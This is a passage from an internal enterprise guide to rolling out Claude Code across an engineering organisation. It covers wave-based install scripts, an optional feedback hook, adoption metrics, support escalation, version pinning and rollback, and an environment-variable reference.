  ssh "$MACHINE" "bash /opt/acme/scripts/install-claude-enterprise.sh"
  sleep 10  # stagger to avoid MDM stampede
done
```

**Feedback collection (week 4):**

Deploy a `SessionEnd` hook that collects structured feedback:

```bash
#!/usr/bin/env bash
# hooks/session-feedback-collector.sh
# Every 5th session, prompt for quick feedback (non-blocking)

SESSION_COUNT_FILE="$HOME/.claude/.session-count"
COUNT=$(cat "$SESSION_COUNT_FILE" 2>/dev/null || echo "0")
NEW_COUNT=$((COUNT + 1))
echo "$NEW_COUNT" > "$SESSION_COUNT_FILE"

if [ $((NEW_COUNT % 5)) -eq 0 ]; then
  # Non-blocking background feedback prompt
  (
    RESPONSE=$(zenity --entry \
      --title="Claude Code Feedback" \
      --text="Quick feedback (optional): What could be better?" \
      --timeout=30 2>/dev/null || echo "")

    if [ -n "$RESPONSE" ]; then
      curl -s -X POST "https://feedback.internal.acme.com/claude" \
        -H "Content-Type: application/json" \
        -d "{\"user\": \"$USER\", \"feedback\": \"$RESPONSE\", \"session\": \"${SESSION_ID:-}\"}"
    fi
  ) &
fi
```

**Phase 2 success criteria:**
- Net Promoter Score ≥ 7 from feedback survey
- ≥ 70% of cohort using Claude Code ≥ 3 days per week
- No P1 incidents caused by Claude Code
- Cost per developer trending ≤ projected budget
- Hook false positive rate < 2% of sessions

### Phase 3: Broad Rollout (Weeks 7–16)

**Objective:** Roll out to all 500+ engineers in phased waves by team.

**Wave schedule (adjust to your org size):**

| Wave | Engineers | Teams | Duration | Notes |
|------|----------|-------|---------|-------|
| 1 | 50–80 | 3–4 teams, vary by stack | 1 week | Monitor closely |
| 2 | 100–150 | 5–8 teams | 1 week | Incorporate Wave 1 learnings |
| 3 | 200–250 | All remaining | 2 weeks | Full support channel active |
| 4 | Remaining | Holdouts + new hires | Ongoing | Standard onboarding |

**Automated rollout script:**

```bash
#!/usr/bin/env bash
# rollout-wave.sh <wave-number>
# Usage: rollout-wave.sh 2

WAVE="$1"
WAVE_FILE="/opt/acme/rollout/wave-${WAVE}.txt"

if [ ! -f "$WAVE_FILE" ]; then
  echo "Wave file not found: $WAVE_FILE"
  exit 1
fi

SUCCESS=0
FAILED=0

while IFS= read -r LDAP_USER; do
  MACHINE=$(ldap_get_primary_machine "$LDAP_USER")
  if ssh -o ConnectTimeout=5 "$MACHINE" \
       "bash /opt/acme/scripts/install-claude-enterprise.sh" 2>/dev/null; then
    echo "OK: $LDAP_USER ($MACHINE)"
    ((SUCCESS++))
  else
    echo "FAIL: $LDAP_USER ($MACHINE)" >&2
    ((FAILED++))
  fi
  sleep 2
done < "$WAVE_FILE"

echo ""
echo "Wave $WAVE complete: $SUCCESS succeeded, $FAILED failed"
if [ $FAILED -gt 0 ]; then
  echo "Failed machines logged to /var/log/claude-rollout-wave${WAVE}-failures.log"
fi
```

### Success Metrics

Track these KPIs from the OTEL dashboard, reported weekly:

| Metric | Target (6 months post-rollout) | Notes |
|--------|-------------------------------|-------|
| Active users / total users | ≥ 75% | Active = used Claude Code ≥ once in last 7 days |
| Daily active users | ≥ 50% | Indicator of deep adoption |
| Cost per developer per month | < $200 | Adjust based on model policy |
| Cache hit rate org-wide | > 50% | Indicator of CLAUDE.md quality |
| Hook false positive rate | < 1% of sessions | Higher = disruption, lower adoption |
| Secrets blocked by hooks | Track count | Any > 0 validates the investment |
| Time-to-feature (sprint metric) | 15–25% reduction | Survey-based, compare pre/post |
| PR review cycle time | 20–30% reduction | Measurable from git/Jira |

### Common Objections and Responses

**"AI will commit bad code to our repos"**

Response: Claude Code requires developer approval for all commits — it never pushes automatically. The `Bash(git push *)` tool is explicitly in our allowlist only for engineers who opt in. All file writes go through `PreFileWrite` hooks with secret detection. The developer remains the decision-maker; Claude Code is a highly capable assistant, not an autonomous agent in production.

**"We can't send our code to a third-party API"**

Response: We've deployed on AWS Bedrock / GCP Vertex AI, which means your code never leaves your cloud environment. The model runs inside your AWS/GCP account boundary. Additionally, Claude Code doesn't send full codebases — it reads files locally and only sends relevant context per query. Our OTEL audit trail shows exactly what was sent each session.

**"The cost is too high / uncontrolled"**

Response: We've implemented per-developer daily budget caps enforced at the managed settings level — developers cannot exceed their allocation. Our FinOps dashboard shows cost per developer, per team, and per project in real time. We've also configured prompt caching and model tier policies that put Haiku on routine tasks (80% cheaper than Sonnet), reserving Sonnet/Opus for complex work.

**"We'll become dependent on it and not learn"**

Response: Claude Code has a `plan` mode that only explains what it would do without executing. Junior developers can use this to build understanding. Our model tier policy assigns lower-capability models to junior engineers by default, encouraging active engagement rather than passive acceptance. The `/advisor` command provides architecture guidance without writing code.

**"What if the API goes down?"**

Response: Claude Code works offline for local analysis. For API-dependent tasks, we have failover routing between Bedrock and Vertex AI, with automated health checks. Our CI/CD pipelines have fallback steps for when Claude Code is unavailable. We treat it as an enhancement to developer velocity, not a critical dependency in the build pipeline.

---

## 13. Enterprise Support & Escalation

### Support Channels

| Issue Type | Primary Channel | Escalation | SLA |
|-----------|----------------|-----------|-----|
| Individual developer issue | Internal Slack `#claude-code-help` | Platform team DM | Best effort |
| Configuration/policy question | Platform team Confluence wiki | Platform team | 1 business day |
| Compliance hook failure | JIRA ticket → Security team | CISO | 4 hours |
| Cost anomaly (>2× expected) | FinOps Slack alert | AI Ops lead | 2 hours |
| API outage / availability | Status page: status.anthropic.com | Anthropic Enterprise Support | Per SLA |
| Data handling / privacy concern | Legal & Compliance | CISO + Legal | 1 business day |

**Anthropic Enterprise Support:**

Enterprise customers have access to Anthropic Enterprise Support with defined SLAs. Contact information and escalation paths are provided in your enterprise agreement. For P0/P1 incidents:

1. File a ticket via the Anthropic enterprise portal
2. Escalate in your Anthropic Slack Connect channel (if provisioned)
3. Call the enterprise support line for critical production incidents

### Version Pinning Strategies

**For developer workstations:**

```json
// managed-settings.json
{
  "disableAutoUpdate": true,
  "pinnedVersion": "2.1.126"
}
```

**For Docker/CI images:**

```dockerfile
FROM node:20-slim AS base
# Pin exact Claude Code version — never use 'latest' in production CI
RUN npm install -g @anthropic-ai/claude-code@2.1.126

# Verify the installed version
RUN claude --version | grep -q "2.1.126" || (echo "Version mismatch" && exit 1)
```

**Managed rollout for version upgrades:**

When upgrading from `2.1.126` to a future version:

```
1. Platform team tests new version on pilot machines (1 week)
2. Run regression tests: test-policy.sh, compliance hook validation
3. Update Claude-Training content for any breaking changes
4. Stage rollout: pilot → early adopters → broad rollout (same wave structure)
5. Keep previous version available for 2 weeks as rollback target
6. Update CLAUDE_CODE_VERSION pin in all CI/CD configs
```

**Rollback procedure:**

```bash
# Emergency rollback to previous version
npm install -g @anthropic-ai/claude-code@2.1.100  # previous stable

# Update managed settings to pin old version
sed -i 's/"pinnedVersion": "2.1.126"/"pinnedVersion": "2.1.100"/' \
  /etc/claude-code/managed-settings.json

# Notify team via incident channel
curl -s -X POST "$SLACK_WEBHOOK" \
  -H "Content-Type: application/json" \
  -d '{"text": "Claude Code rolled back to v2.1.100 — investigation in progress"}'
```

### Incident Response for AI-Related Outages

**Severity definitions:**

| Severity | Definition | Example |
|----------|-----------|---------|
| P0 | All developers blocked, CI/CD failing | API key revoked, Bedrock auth failure |
| P1 | > 50 developers affected or compliance breach | Hook false positive blocks all writes |
| P2 | > 10 developers affected | MCP server down, OTEL not collecting |
| P3 | Individual developer issue | Plugin not loading, settings misconfigured |

**P0/P1 runbook:**

```
1. IMMEDIATE (0–15 min)
   - Identify blast radius: how many developers affected?
   - Check Anthropic status page: status.anthropic.com
   - Check cloud provider status (AWS/GCP if using Bedrock/Vertex)
   - Disable blocking hooks if they're causing the P0

2. INVESTIGATION (15–60 min)
   - Review OTEL traces for error patterns
   - Check managed-settings.json was not accidentally modified
   - Review recent plugin version changes
   - Examine system logs: /var/log/claude-code/

3. MITIGATION (varies)
   - Roll back if recent version change caused the issue
   - Switch cloud provider if API outage (Bedrock ↔ Vertex ↔ Direct API)
   - Disable non-essential hooks to unblock developers
   - Issue workaround instructions to #claude-code-help

4. RESOLUTION & POSTMORTEM
   - Root cause analysis in JIRA
   - Update runbooks with new failure mode
   - Review whether policy or monitoring could have caught it sooner
```

---

## Appendix: Environment Variable Quick Reference

| Variable | Purpose | Example |
|----------|---------|---------|
| `ANTHROPIC_API_KEY` | Direct API authentication | `sk-ant-...` |
| `ANTHROPIC_MODEL` | Default model | `claude-sonnet-4-6` |
| `ANTHROPIC_BUDGET_TOKEN_CAP` | Hard token limit per session | `500000` |
| `ANTHROPIC_BUDGET_USD_CAP` | Hard dollar limit per session | `5.00` |
| `CLAUDE_CODE_USE_BEDROCK` | Enable Bedrock routing | `1` |
| `CLAUDE_CODE_USE_VERTEX` | Enable Vertex AI routing | `1` |
| `CLOUD_ML_REGION` | Vertex AI region | `us-east5` |
| `ANTHROPIC_VERTEX_PROJECT_ID` | GCP project for Vertex | `acme-ai-prod` |
| `AWS_REGION` | AWS region for Bedrock | `us-east-1` |
| `CLAUDE_CODE_MANAGED_SETTINGS_PATH` | Override managed settings path | `/etc/claude-code/managed-settings.json` |
| `CLAUDE_CODE_PERMISSION_MODE` | Session permission mode | `acceptEdits` |
| `DISABLE_TELEMETRY` | Disable all telemetry | `1` |
| `DISABLE_UPDATES` | Disable auto-updates | `1` |
| `OTEL_EXPORTER_OTLP_ENDPOINT` | OTEL collector endpoint | `https://otel.corp.com:4318` |
| `OTEL_EXPORTER_OTLP_PROTOCOL` | OTEL transport protocol | `http/protobuf` |
| `OTEL_EXPORTER_OTLP_HEADERS` | OTEL auth headers | `x-api-key=...` |
| `OTEL_SERVICE_NAME` | OTEL service identifier | `claude-code` |
| `OTEL_RESOURCE_ATTRIBUTES` | OTEL static attributes | `env=prod,team=payments` |
| `CLAUDE_CODE_MCP_CLIENT_ID` | OAuth client ID for MCP | `claude-code-prod` |
| `CLAUDE_CODE_MCP_CLIENT_SECRET` | OAuth client secret for MCP | (from vault) |
| `SIEM_ENDPOINT` | SIEM forwarding URL (hooks) | `https://siem.corp.com` |
| `SIEM_TOKEN` | SIEM auth token (hooks) | (from vault) |
| `JIRA_TOKEN` | Jira API token (stop hooks) | (from vault) |

---

---

## Related Visual Guides

- [Enterprise Deployment — Diagram](./enterprise-diagram) — Interactive managed settings hierarchy, auth provider comparison, audit logging destinations, cost governance dashboard, and rollout playbook
- [Permissions & Security — Diagram](./permissions-diagram) — Visual permission layer pyramid, sandbox architecture, and audit log format
- [CI/CD Pipeline — Diagram](./cicd-diagram) — Full pipeline flow with Bedrock/Vertex auth patterns

---

*Document version: v2.1.126 · Last updated: 2026-06-02 · Maintained by Platform Team*
*Feedback: `#claude-code-help` on Slack or open a ticket in JIRA → PLATFORM project*
